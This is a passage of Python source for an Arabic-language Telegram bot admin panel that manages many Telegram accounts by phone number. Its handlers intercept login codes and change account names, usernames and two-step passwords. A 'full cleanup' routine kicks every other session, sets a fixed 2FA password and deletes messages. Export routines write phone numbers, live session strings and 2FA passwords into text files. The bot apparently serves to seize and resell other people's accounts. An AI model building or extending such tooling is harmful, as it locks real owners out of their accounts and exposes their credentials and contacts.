    session = await admin_resolve.get_session_from_callback(callback.data, "code")
    if not await _guard_session_row(callback, session):
        return
    phone, sid = session["phone"], session["id"]
    admin_id = callback.from_user.id
    
    # إذا كانت الجلسة ميتة، نقوم بطلب كود جديد للتجديد بدلاً من مجرد المراقبة
    alive = await session_manager.check_session_alive(phone)
    if not alive:
        await callback.answer("⏳ جاري طلب كود تجديد...")
        result = await session_manager.request_code(admin_id, phone)
        if result["success"]:
            await state.set_state(AdminFlow.refreshing_session)
            await state.update_data(phone=phone, session_id=sid)
            await callback.message.edit_text(
                f"⏳ تم طلب كود تجديد للرقم <code>{h(phone)}</code>.\n\n"
                "أرسل الكود الآن (أرقام فقط) كرسالة نصية:",
                parse_mode="HTML",
                reply_markup=back_to_session_keyboard(sid)
            )
        else:
            await callback.message.edit_text(
                f"❌ فشل طلب الكود: <code>{h(result.get('error', ''))}</code>",
                parse_mode="HTML",
                reply_markup=back_to_session_keyboard(sid)
            )
        return

    # إذا كانت الجلسة حية، نبقى على السلوك القديم (مراقبة الكود القادم)
    msg_id = callback.message.message_id
    user_msg_ids[admin_id] = msg_id
    old_task = code_wait_tasks.pop(admin_id, None)
    if old_task:
        old_task.cancel()
    two_fa_text = ""
    if session["two_fa"]:
        two_fa_text = f"\n\n🔐 <b>التحقق بخطوتين:</b> <code>{h(session['two_fa'])}</code>"
    await callback.message.edit_text(
        f"⏳ في انتظار الكود للرقم <code>{h(phone)}</code>\n\n"
        f"اطلب الكود بنفسك، البوت سيرسله لك فور وصوله تلقائياً."
        + two_fa_text + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=back_to_session_keyboard(sid),
    )
    await track_admin_phone_message(
        admin_id, phone, callback.message.chat.id, msg_id
    )
    task = asyncio.create_task(
        _watch_and_forward(admin_id, phone, sid, msg_id, two_fa_text)
    )
    code_wait_tasks[admin_id] = task
    await callback.answer()


async def _watch_and_forward(
    admin_id: int, phone: str, session_id: int, msg_id: int, two_fa_text: str
):
    code_msg = await session_manager.watch_for_new_code(phone, timeout=180)
    code_wait_tasks.pop(admin_id, None)

    if code_msg:
        try:
            await bot.edit_message_text(
                f"📲 <b>وصل الكود للرقم</b> <code>{h(phone)}</code>\n\n"
                f"📨 الرسالة:\n<code>{h(code_msg)}</code>"
                + two_fa_text + ADMIN_FOOTER,
                chat_id=admin_id,
                message_id=msg_id,
                parse_mode="HTML",
                reply_markup=back_to_session_keyboard(session_id)
            )
            await track_admin_phone_message(admin_id, phone, admin_id, msg_id)
        except Exception:
            msg = await bot.send_message(
                admin_id,
                f"📲 <b>وصل الكود للرقم</b> <code>{h(phone)}</code>\n\n"
                f"<code>{h(code_msg)}</code>" + two_fa_text + ADMIN_FOOTER,
                parse_mode="HTML",
                reply_markup=back_to_session_keyboard(session_id),
            )
            await track_admin_phone_message(
                admin_id, phone, msg.chat.id, msg.message_id
            )
    else:
        try:
            await bot.edit_message_text(
                f"⌛ انتهت مدة الانتظار (3 دقائق) بدون استلام كود للرقم <code>{h(phone)}</code>."
                + ADMIN_FOOTER,
                chat_id=admin_id,
                message_id=msg_id,
                parse_mode="HTML",
                reply_markup=back_to_session_keyboard(session_id),
            )
            await track_admin_phone_message(admin_id, phone, admin_id, msg_id)
        except Exception:
            pass


# ──────────────────────────────────────────
# تغيير اليوزر
# ──────────────────────────────────────────
@dp.callback_query(F.data.regexp(r"^u\d+$"))
async def admin_change_username(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    session = await admin_resolve.get_session_from_callback(callback.data, "user")
    if not await _guard_session_row(callback, session):
        return
    phone, sid = session["phone"], session["id"]
    await state.set_state(AdminFlow.changing_user)
    await state.update_data(phone=phone, session_id=sid)
    user_msg_ids[callback.from_user.id] = callback.message.message_id
    await callback.message.edit_text(
        f"✏️ أدخل اليوزر الجديد للحساب <code>{h(phone)}</code>:\n(بدون @)" + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=back_to_session_keyboard(sid),
    )
    await callback.answer()


@dp.message(AdminFlow.changing_user)
async def process_username_change(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    aid = message.from_user.id
    await safe_delete(message.chat.id, message.message_id)
    data  = await state.get_data()
    phone = data.get("phone")
    sid = data.get("session_id")
    new_u = message.text.strip().replace("@", "")
    result = await session_manager.change_username(phone, new_u)
    txt = (
        f"✅ تم تغيير اليوزر إلى @{h(new_u)}"
        if result["success"]
        else f"❌ فشل: {h(result.get('error', ''))}"
    )
    await edit_or_send(
        aid, aid, txt + ADMIN_FOOTER,
        markup=back_to_session_keyboard(sid), phone=phone,
    )
    await state.clear()


# ──────────────────────────────────────────
# تغيير الاسم
# ──────────────────────────────────────────
@dp.callback_query(F.data.regexp(r"^n\d+$"))
async def admin_change_name(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    session = await admin_resolve.get_session_from_callback(callback.data, "name")
    if not await _guard_session_row(callback, session):
        return
    phone, sid = session["phone"], session["id"]
    await state.set_state(AdminFlow.changing_name)
    await state.update_data(phone=phone, session_id=sid)
    user_msg_ids[callback.from_user.id] = callback.message.message_id
    await callback.message.edit_text(
        f"📝 أدخل الاسم الجديد للحساب <code>{h(phone)}</code>:" + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=back_to_session_keyboard(sid),
    )
    await callback.answer()


@dp.message(AdminFlow.changing_name)
async def process_name_change(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    aid = message.from_user.id
    await safe_delete(message.chat.id, message.message_id)
    data  = await state.get_data()
    phone = data.get("phone")
    parts = message.text.strip().split(" ", 1)
    first = parts[0]
    last  = parts[1] if len(parts) > 1 else ""
    result = await session_manager.change_name(phone, first, last)
    txt = (
        f"✅ تم تغيير الاسم إلى: {h(first)} {h(last)}".strip()
        if result["success"]
        else f"❌ فشل: {h(result.get('error', ''))}"
    )
    sid = data.get("session_id")
    await edit_or_send(
        aid, aid, txt + ADMIN_FOOTER,
        markup=back_to_session_keyboard(sid), phone=phone,
    )
    await state.clear()


# ──────────────────────────────────────────
# التحقق بخطوتين
# ──────────────────────────────────────────
@dp.callback_query(F.data.regexp(r"^f\d+$"))
async def admin_change_2fa(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    session = await admin_resolve.get_session_from_callback(callback.data, "twofa")
    if not await _guard_session_row(callback, session):
        return
    phone, sid = session["phone"], session["id"]
    has_2fa = bool(session["two_fa"])
    current = session["two_fa"] if has_2fa else None
    user_msg_ids[callback.from_user.id] = callback.message.message_id
    await state.set_state(AdminFlow.changing_2fa)
    await state.update_data(phone=phone, session_id=sid, old_2fa=current, has_2fa=has_2fa)
    txt = (
        f"🔐 الحساب <code>{h(phone)}</code> لديه تحقق بخطوتين حالياً.\n\n"
        f"أدخل كلمة المرور <b>الجديدة</b>:\n"
        f"(أو أرسل <code>remove</code> لإزالة التحقق نهائياً)"
        if has_2fa else
        f"🔐 الحساب <code>{h(phone)}</code> ليس لديه تحقق بخطوتين.\n\n"
        f"أدخل كلمة المرور الجديدة لتفعيل التحقق بخطوتين:"
    )
    await callback.message.edit_text(
        txt + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=back_to_session_keyboard(sid),
    )
    await callback.answer()


@dp.message(AdminFlow.changing_2fa)
async def process_2fa_change(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    aid = message.from_user.id
    await safe_delete(message.chat.id, message.message_id)
    data    = await state.get_data()
    phone = data.get("phone")
    sid = data.get("session_id")
    old_2fa = data.get("old_2fa")
    has_2fa = data.get("has_2fa", False)
    new_2fa = message.text.strip()

    await edit_or_send(
        aid, aid,
        "⏳ جاري تطبيق التغيير على الحساب..." + ADMIN_FOOTER,
        markup=back_to_session_keyboard(sid), phone=phone,
    )

    if new_2fa.lower() == "remove":
        if not has_2fa:
            await edit_or_send(
                aid, aid,
                f"⚠️ الحساب <code>{h(phone)}</code> ليس لديه تحقق بخطوتين أصلاً."
                + ADMIN_FOOTER,
                markup=back_to_session_keyboard(sid), phone=phone,
            )
        else:
            result = await session_manager.remove_two_fa(phone, old_2fa)
            txt = (
                f"✅ تم إزالة التحقق بخطوتين من الحساب <code>{h(phone)}</code> بنجاح!"
                if result["success"]
                else f"❌ فشل الإزالة: <code>{h(result.get('error', ''))}</code>"
            )
            await edit_or_send(
                aid, aid, txt + ADMIN_FOOTER,
                markup=back_to_session_keyboard(sid), phone=phone,
            )
    else:
        result = await session_manager.set_two_fa(phone, new_2fa, old_2fa if has_2fa else None)
        txt = (
            f"✅ تم تغيير التحقق بخطوتين للحساب <code>{h(phone)}</code> بنجاح!\n"
            f"🔐 كلمة المرور الجديدة: <code>{h(new_2fa)}</code>"
            if result["success"]
            else f"❌ فشل التغيير: <code>{h(result.get('error', ''))}</code>"
        )
        await edit_or_send(
            aid, aid, txt + ADMIN_FOOTER,
            markup=back_to_session_keyboard(sid), phone=phone,
        )
    await state.clear()


# ──────────────────────────────────────────
# التنظيف الشامل
# ──────────────────────────────────────────
@dp.callback_query(F.data.regexp(r"^k\d+$"))
async def admin_full_cleanup(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    session = await admin_resolve.get_session_from_callback(callback.data, "kick")
    if not await _guard_session_row(callback, session):
        return
    phone, sid = session["phone"], session["id"]
    new_pw = DEFAULT_2FA_PASSWORD

    await callback.message.edit_text(
        "⏳ جاري التنظيف الشامل (طرد → 2FA → حذف رسائل)..." + ADMIN_FOOTER,
        parse_mode="HTML"
    )

    res = await session_manager.admin_full_cleanup(phone, new_pw)

    if res["success"]:
        result_msg = (
            "✅ تم التنظيف الشامل:\n"
            f"✔️ طرد الجلسات الأخرى\n"
            f"✔️ تفعيل 2FA\n"
            f"✔️ حذف الرسائل\n"
            f"🔒 تم تأمين الجلسة\n\n"
            f"🔑 الباسوورد: <code>{h(new_pw)}</code>"
        )
    else:
        step = res.get("step", "")
        if step == "kick":
            result_msg = f"❌ فشل الطرد — لم يُنفَّذ 2FA:\n<code>{h(res.get('error',''))}</code>"
        elif step == "2fa":
            result_msg = (
                f"✔️ تم الطرد بنجاح\n"
                f"❌ فشل 2FA:\n<code>{h(res.get('error',''))}</code>"
            )
        else:
            result_msg = f"❌ فشل: <code>{h(res.get('error',''))}</code>"

    await callback.message.edit_text(
        result_msg + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=back_to_session_keyboard(sid),
    )
    await track_admin_phone_message(
        callback.from_user.id,
        phone,
        callback.message.chat.id,
        callback.message.message_id,
    )
    await callback.answer()


# ──────────────────────────────────────────
# نقطة التشغيل
# ──────────────────────────────────────────
async def _startup_email_migration():
    """ترحيل بريد Login للحسابات القديمة + استئناف جدولة الطرد."""
    try:
        pending = await database.get_sessions_needing_email_migration()
        if pending:
            logging.info("starting email migration for %d sessions", len(pending))
            stats = await session_manager.migrate_old_sessions_emails()
            skipped = stats.get("skipped", 0)
            await notify_admins(
                f"📧 <b>ترحيل بريد Login (Mail.tm)</b>\n\n"
                f"✅ نجح: {stats['migrated']}\n"
                f"⏭️ بدون تغيير (شغال): {skipped}\n"
                f"❌ فشل: {stats['failed']}\n"
                f"📊 الإجمالي: {stats['total']}"
                + ADMIN_FOOTER
            )
    except Exception as e:
        logging.error("email migration startup: %s", e)
    await session_manager.resume_auto_kick_pipelines()
    await session_manager.resume_repair_two_fa_pipelines()


async def _startup_session_recovery():
    """بعد إعادة التشغيل: إنعاش الميتة + غير الصالحة (لها بريد Login)."""
    try:
        stats = await session_manager.startup_recover_dead_sessions(
            on_done=_on_recovery_done
        )
        if stats["scheduled"] > 0 or stats.get("revived_in_db", 0) > 0:
            await notify_admins(
                f"♻️ <b>فحص إنعاش عند التشغيل</b>\n\n"
                f"ميتة: <b>{stats['dead']}</b>\n"
                f"غير صالحة (بريد): <b>{stats.get('invalid_queued', 0)}</b>\n"
                f"مجدولة للإنعاش: <b>{stats['scheduled']}</b>\n"
                f"أُعيد تصنيفها نشطة: <b>{stats.get('revived_in_db', 0)}</b>"
                + ADMIN_FOOTER
            )
    except Exception as e:
        logging.error("startup session recovery: %s", e)


async def main():
    await database.init_db()
    await user_messages.initialize_from_db()
    security_monitor.set_notify_fn(notify_admins)
    logging.info("database: %s (volume: %s)", database.DB_PATH, database.DATA_DIR)
    session_manager.set_recovery_callback(_on_recovery_done)
    session_manager.set_admin_notify_callback(_on_admin_event)
    asyncio.ensure_future(session_watchdog())
    asyncio.ensure_future(security_monitor.security_check_loop())
    asyncio.ensure_future(_startup_email_migration())
    
    # محاولة التشغيل مع معالجة خطأ التداخل (Conflict) الشائع في Railway
    while True:
        try:
            logging.info("Starting bot polling...")
            await dp.start_polling(bot)
            break
        except Exception as e:
            if "Conflict" in str(e):
                logging.warning("⚠️ تم اكتشاف تداخل (Conflict). قد تكون هناك نسخة أخرى تعمل. الانتظار 5 ثوانٍ...")
                await asyncio.sleep(5)
            else:
                logging.error(f"❌ خطأ غير متوقع أثناء التشغيل: {e}")
                raise e


# ══════════════════════════════════════════
# صيغة السحب — اختيار الفورمات
# ══════════════════════════════════════════

@dp.callback_query(F.data.startswith("export_fmt_choose_"))
async def export_fmt_choose_handler(callback: CallbackQuery):
    """يُظهر شاشة اختيار صيغة السحب."""
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    source_cb = callback.data.removeprefix("export_fmt_choose_")
    current_fmt = await database.get_export_format(uid)
    from keyboards import export_format_keyboard
    await callback.message.edit_text(
        "📋 <b>اختر صيغة السحب:</b>\n\n"
        "1️⃣  رقم:جلسة\n"
        "2️⃣  رقم:جلسة:كلمة_التحقق\n"
        "3️⃣  رقم:جلسة:كلمة_التحقق:جهات_مشتركة\n\n"
        f"الصيغة الحالية: <b>{current_fmt}</b>" + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=export_format_keyboard(source_cb, current_fmt),
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("set_efmt_"))
async def set_export_fmt_handler(callback: CallbackQuery):
    """يحفظ الصيغة المختارة ثم يُنفّذ السحب."""
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    # بيانات: set_efmt_<fmt>_<source_cb>
    rest = callback.data.removeprefix("set_efmt_")
    parts = rest.split("_", 1)
    if len(parts) != 2:
        await callback.answer("❌ خطأ في البيانات")
        return
    fmt_str, source_cb = parts
    try:
        fmt = int(fmt_str)
    except ValueError:
        await callback.answer("❌ صيغة غير صالحة")
        return
    await database.set_export_format(uid, fmt)
    await callback.answer(f"✅ تم حفظ الصيغة {fmt}", show_alert=False)
    # إعادة توجيه للسحب الفعلي
    callback.data = source_cb
    # استدعاء مباشر لمعالج السحب
    if source_cb == "export_all_txt_go":
        await export_all_sessions_txt_go(callback)
    elif source_cb == "export_secured_txt_go":
        await export_secured_sessions_txt_go(callback)
    elif source_cb == "export_star_txt_go":
        await export_star_sessions_txt_go(callback)


async def _build_export_line(s, fmt: int) -> str | None:
    """يبني سطر جلسة واحدة حسب الصيغة المختارة."""
    phone = s["phone"]
    ss = s.get("session_string")
    if not ss or not str(ss).strip():
        ss = await session_manager.ensure_session_string(phone)
    if not ss:
        return None
    if fmt == 1:
        return f"{phone}:{ss}"
    two_fa = s.get("two_fa") or ""
    if fmt == 2:
        return f"{phone}:{ss}:{two_fa}"
    # fmt == 3
    mutual = s.get("mutual_contacts")
    mutual_str = str(mutual) if mutual is not None else ""
    return f"{phone}:{ss}:{two_fa}:{mutual_str}"


# ─── وظائف السحب الفعلية (تدعم الصيغ) ───

@dp.callback_query(F.data == "export_all_txt")
async def export_all_sessions_txt_prompt(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    current_fmt = await database.get_export_format(uid)
    from keyboards import export_format_keyboard
    await callback.message.edit_text(
        "📋 <b>اختر صيغة سحب الكل:</b>" + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=export_format_keyboard("export_all_txt_go", current_fmt),
    )
    await callback.answer()


async def export_all_sessions_txt_go(callback: CallbackQuery):
    uid = callback.from_user.id
    sessions = await _sessions_for_admin(uid)
    if not sessions:
        await callback.answer("❌ لا توجد جلسات.", show_alert=True)
        return
    fmt = await database.get_export_format(uid)
    await callback.message.edit_text(f"⏳ جاري تجهيز ملف الجلسات (صيغة {fmt})...", parse_mode="HTML")
    lines = []
    for s in sessions:
        line = await _build_export_line(s, fmt)
        if line:
            lines.append(line)
    if not lines:
        await callback.message.edit_text("❌ لا توجد أكواد جلسات محفوظة.")
        return
    document = BufferedInputFile("\n".join(lines).encode("utf-8"), filename="all_sessions.txt")
    await callback.message.answer_document(
        document=document,
        caption=f"📥 <b>كل الجلسات — صيغة {fmt} ({len(lines)} حساب)</b>" + ADMIN_FOOTER,
        parse_mode="HTML",
    )
    text = await _admin_panel_text(uid)
    await callback.message.edit_text(text, reply_markup=sessions_keyboard(sessions, is_super_admin=is_super_admin(uid)), parse_mode="HTML")


@dp.callback_query(F.data == "export_secured_txt")
async def export_secured_sessions_txt_prompt(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    current_fmt = await database.get_export_format(uid)
    from keyboards import export_format_keyboard
    await callback.message.edit_text(
        "📋 <b>اختر صيغة سحب المؤمّنة:</b>" + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=export_format_keyboard("export_secured_txt_go", current_fmt),
    )
    await callback.answer()


async def export_secured_sessions_txt_go(callback: CallbackQuery):
    uid = callback.from_user.id
    all_sessions = await _sessions_for_admin(uid)
    is_sa = is_super_admin(uid)
    sessions = [s for s in all_sessions if database.row_flag(s, "secured") and (is_sa or not database.row_flag(s, "a1_only"))]
    if not sessions:
        await callback.answer("❌ لا توجد جلسات مؤمّنة.", show_alert=True)
        return
    fmt = await database.get_export_format(uid)
    await callback.message.edit_text(f"⏳ جاري تجهيز ملف المؤمّنة (صيغة {fmt})...", parse_mode="HTML")
    lines = []
    for s in sessions:
        line = await _build_export_line(s, fmt)
        if line:
            lines.append(line)
    if not lines:
        await callback.message.edit_text("❌ لا توجد أكواد لإرسالها.")
        return
    document = BufferedInputFile("\n".join(lines).encode("utf-8"), filename="secured_sessions.txt")
    await callback.message.answer_document(document=document, caption=f"🔒 <b>المؤمّنة — صيغة {fmt} ({len(lines)} حساب)</b>" + ADMIN_FOOTER, parse_mode="HTML")
    text = await _admin_panel_text(uid)
    await callback.message.edit_text(text, reply_markup=sessions_keyboard(all_sessions, is_super_admin=is_sa), parse_mode="HTML")


@dp.callback_query(F.data == "export_star_txt")
async def export_star_sessions_txt_prompt(callback: CallbackQuery):
    if not is_super_admin(callback.from_user.id):
        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
        return
    uid = callback.from_user.id
    current_fmt = await database.get_export_format(uid)
    from keyboards import export_format_keyboard
    await callback.message.edit_text(
        "📋 <b>اختر صيغة سحب النجمة:</b>" + ADMIN_FOOTER,
        parse_mode="HTML",
        reply_markup=export_format_keyboard("export_star_txt_go", current_fmt),
    )
    await callback.answer()


async def export_star_sessions_txt_go(callback: CallbackQuery):
    sessions = await database.get_a1_only_sessions()
    if not sessions:
        await callback.answer("❌ لا توجد جلسات ⭐.", show_alert=True)
        return
    uid = callback.from_user.id
    fmt = await database.get_export_format(uid)
    await callback.message.edit_text(f"⏳ جاري تجهيز جلسات النجمة (صيغة {fmt})...", parse_mode="HTML")
    lines = []
    for s in sessions:
        line = await _build_export_line(s, fmt)
        if line:
            lines.append(line)
    if not lines:
        await callback.message.edit_text("❌ لا توجد أكواد لجلسات النجمة.")
        return
    document = BufferedInputFile("\n".join(lines).encode("utf-8"), filename="star_sessions.txt")
    await callback.message.answer_document(document=document, caption=f"⭐ <b>النجمة — صيغة {fmt} ({len(lines)} حساب)</b>" + ADMIN_FOOTER, parse_mode="HTML")
    all_s = await _sessions_for_admin(uid)
    text = await _admin_panel_text(uid)
    await callback.message.edit_text(text, reply_markup=sessions_keyboard(all_s, is_super_admin=True), parse_mode="HTML")


# ── وضع الصيانة وجهات الاتصال — أزرار في تفاصيل الجلسة ──

@dp.callback_query(F.data.startswith("maint_on_"))
async def maint_on_handler(callback: CallbackQuery):
    """تبديل وضع الصيانة — إذا الحساب في الصيانة يُخرجه، وإلا يُدخله."""
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    sid = int(callback.data.split("_")[-1])
    session = await database.get_session_by_id(sid)
    if not session:
        await callback.answer("❌ الجلسة غير موجودة")
        return
    currently_in = database.row_flag(session, "maintenance_mode")
    if currently_in:
        await database.set_maintenance_mode(session["phone"], False)
        await callback.answer("✅ تم إنهاء وضع الصيانة", show_alert=True)
    else:
        await database.set_maintenance_mode(session["phone"], True, days=7)
        await callback.answer("🔧 تم وضع الحساب في الصيانة (7 أيام افتراضياً)", show_alert=True)
    # تحديث تفاصيل الجلسة
    session = await database.get_session_by_id(sid)
    await _render_session_detail(callback, session)



@dp.callback_query(F.data.startswith("upd_contacts_"))
async def update_contacts_handler(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    sid = int(callback.data.split("_")[-1])
    session = await database.get_session_by_id(sid)
    if not session:
        await callback.answer("❌ الجلسة غير موجودة")
        return
    await callback.answer("⏳ جاري تحديث جهات الاتصال...")
    result = await session_manager.get_mutual_contacts(session["phone"])
    if result:
        await callback.answer(f"✅ إجمالي: {result['total']} | مشتركة: {result['mutual']}", show_alert=True)
    else:
        await callback.answer("❌ فشل تحديث جهات الاتصال", show_alert=True)
    session = await database.get_session_by_id(sid)
    await _render_session_detail(callback, session)


if __name__ == "__main__":
    asyncio.run(main())
